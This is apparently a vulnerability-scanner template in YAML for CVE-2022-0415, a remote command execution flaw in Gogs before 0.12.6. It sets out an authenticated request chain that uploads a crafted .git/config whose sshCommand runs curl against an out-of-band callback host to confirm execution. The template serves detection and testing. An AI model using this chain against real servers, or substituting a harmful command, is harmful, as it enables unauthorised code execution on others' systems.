id: CVE-2022-0415
info:
  name: Gogs <0.12.6 - Remote Command Execution
  author: theamanrawat
  description: 'Gogs before 0.12.6 is susceptible to remote command execution via
    the uploading repository file in GitHub repository gogs/gogs. An attacker can
    execute malware, obtain sensitive information, modify data, and/or gain full control
    over a compromised system without entering necessary credentials.

    '
  severity: high
  impact: 'Successful exploitation of this vulnerability allows remote attackers to
    execute arbitrary commands on the target system.

    '
  remediation: Fixed in version 0.12.6.
  reference:
  - https://github.com/gogs/gogs/commit/0fef3c9082269e9a4e817274942a5d7c50617284
  - https://huntr.dev/bounties/b4928cfe-4110-462f-a180-6d5673797902
  - https://nvd.nist.gov/vuln/detail/CVE-2022-0415
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cve-id: CVE-2022-0415
    cwe-id: CWE-434,CWE-20
    epss-score: 0.1488
    epss-percentile: 0.95273
    cpe: cpe:2.3:a:gogs:gogs:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 6
    vendor: gogs
    product: gogs
  tags: cve,cve2022,rce,gogs,authenticated,huntr,intrusive
traps:
- request:
    method: GET
    path: /user/login
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: content="Gogs
- request:
    method: POST
    path: /user/login
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: '_csrf={{csrf}}&user_name={{username}}&password={{url_encode(password)}}

      '
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: GET
    path: /repo/create
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: POST
    path: /repo/create
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: '_csrf={{auth_csrf}}&user_id=1&repo_name={{randstr}}&description=test&gitignores=&license=&readme=Default&auto_init=on

      '
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: POST
    path: ///upload-file
    headers:
      Accept: application/json
      X-Requested-With: XMLHttpRequest
      X-Csrf-Token: '{{auth_csrf}}'
      Content-Type: multipart/form-data; boundary=---------------------------313811965223810628771946318395
    body: |
      -----------------------------313811965223810628771946318395
      Content-Disposition: form-data; name="file"; filename="config"
      Content-Type: application/octet-stream

      [core]
          repositoryformatversion = 0
          filemode = true
          bare = false
          logallrefupdates = true
          ignorecase = true
          precomposeunicode = true
          sshCommand = curl http://{{interactsh-url}} -I
      [remote "origin"]
          url = git@github.com:torvalds/linux.git
          fetch = +refs/heads/*:refs/remotes/origin/*
      [branch "master"]
          remote = origin
          merge = refs/heads/master
      -----------------------------313811965223810628771946318395--
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: POST
    path: ///_upload/master/
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: '_csrf={{auth_csrf}}&tree_path=/.git/&files={{uuid}}&commit_summary=&commit_message=&commit_choice=direct&new_branch_name=

      '
  response:
    status_code: 200
    headers: {}
    body: ''
